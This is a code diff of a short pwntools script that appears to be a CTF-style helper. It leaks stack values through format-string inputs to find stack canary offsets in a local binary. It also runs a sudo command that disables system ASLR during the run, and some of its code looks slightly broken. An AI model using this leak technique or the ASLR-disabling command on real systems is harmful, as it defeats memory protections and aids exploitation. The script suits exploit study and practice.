@@ -1,30 +1,43 @@
 from pwn import *
 from sys import argv
+from argparse import ArgumentParser
+from os import system
 
-if not 2 <= len(argv) <= 4:
-    print("Error: Invalid number of arguments.")
-    print("Correct usage: canary-checker [file] {amount} {repeats}")
-    exit()
+### Parse arguments
+parser = ArgumentParser(description="Brute some canaries")
 
+parser.add_argument("-f", dest="file", type=str, help="The file to test")
+parser.add_argument("-d", dest="depth", type=int, help="How many format strings should be attempt")
+
+args = parser.parse_args()
+
+### Disable ASLR to ignore libc, set to WARN to prevent flooding of terminal
+system("echo 0 | sudo tee /proc/sys/kernel/randomize_va_space")
 context.log_level = 'WARN'
 
-executable = argv[1]
-amount = 25 if not len(argv) > 2 else int(argv[2])
-repeats = 2 if not len(argv) > 3 else int(argv[3])
+print(args.depth)
 
+### Initialise empty dictionary
 offsets = {}
 
-for x in range(repeats):
-    for x in range(int(amount)):
-        p = ELF("./" + executable).process()
-        p.clean(0.2)
-        p.sendline("%" + str(x) + "$lx")
-        if value.endswith("00"):
-            if x not in offsets:
-                offsets[x] = set()
-            offsets[x].add(value)
+for _ in range(2):
+	for x in range(1, int(args.depth) + 1):
+		p = ELF("./" + args.file).process()
+		p.clean(0.2)
+		p.sendline("%" + str(x) + "$lp")
+
+		value = re.findall(r"0x[0-9A-Fa-f]*", p.recvline())[0]
+
+		if value.endswith("00"):
+			if x not in offsets:
+				offsets[x] = set()
+			offsets[x].add(value)
+
 
 print("#### Possible Due To Changing Value ####")
 for x in offsets:
-    if len(offsets[x]) == repeats:
+    if len(offsets[x]) == 2:
         print(str(x) + ": " + ", ".join(offsets[x]))
+
+
+system("echo 2 | sudo tee /proc/sys/kernel/randomize_va_space")
